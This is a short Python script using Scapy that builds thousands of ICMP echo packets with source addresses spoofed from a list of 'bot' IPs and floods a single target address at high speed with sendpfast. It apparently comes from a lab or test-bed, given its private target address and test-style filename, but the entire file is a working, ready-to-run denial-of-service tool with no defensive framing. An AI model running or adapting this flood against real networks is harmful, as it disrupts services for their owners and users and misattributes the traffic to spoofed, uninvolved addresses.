from scapy.all import *
import random
import time
import ipaddress

# Scapy ICMP Echo Flood (60 seconds)
TARGET_IP = "192.168.100.2"
BOTFILE = "../bots.txt"
NUM_PACKETS = 10000
SEND_DURATION = 60
IFACE = "enp0s3"

def load_bots(filename):
    bot_ips = []
    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)
    return bot_ips

def run_icmp_flood_attack():
    bot_ips = load_bots(BOTFILE)
    packets = []

    start_build = time.perf_counter()
    for _ in range(NUM_PACKETS):
        source_ip = random.choice(bot_ips)
        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        icmp_layer = ICMP(type=8, code=0)
        packet = eth_layer / ip_layer / icmp_layer
        packets.append(packet)
    end_build = time.perf_counter()
    build_duration = end_build - start_build

    print(f"\nPacket creation completed.")
    print(f"Time to build packets: {build_duration:.4f} seconds")
    print(f"\nSending packets for {SEND_DURATION-build_duration} seconds...")

    # Start sending 
    sendpfast(packets, iface=IFACE, file_cache=True, loop=0)

    print(f"\nPacket sending finished.")

if __name__ == "__main__":
    run_icmp_flood_attack()

# timeout -s INT 60 sudo PYTHONPATH=$HOME/scapy python3 scapy_test_icmp_echo_flood.py